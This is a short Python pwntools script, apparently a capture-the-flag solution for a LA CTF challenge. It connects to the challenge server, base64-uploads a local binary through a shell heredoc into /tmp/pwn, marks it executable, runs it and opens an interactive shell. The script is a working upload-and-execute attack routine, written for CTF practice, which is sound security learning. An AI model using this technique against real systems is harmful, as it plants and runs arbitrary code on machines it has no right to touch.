#!/usr/bin/env python3

from pwn import *
import base64

serv = "chall.lac.tf"
port = 31499

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process("./run")
    return r

r = conn()

def main():
    pl = base64.b64encode(open("pwn", "rb").read())
    r.sendlineafter(b"$", b"cat<<EOF|base64 -d>/tmp/pwn;chmod +x /tmp/pwn;/tmp/pwn")
    for i in range(0, len(pl), 0x100):
        r.sendlineafter(b">", pl[i:i+0x100])
    r.sendlineafter(b">", b"EOF")
    r.interactive()


if __name__ == "__main__":
    main()
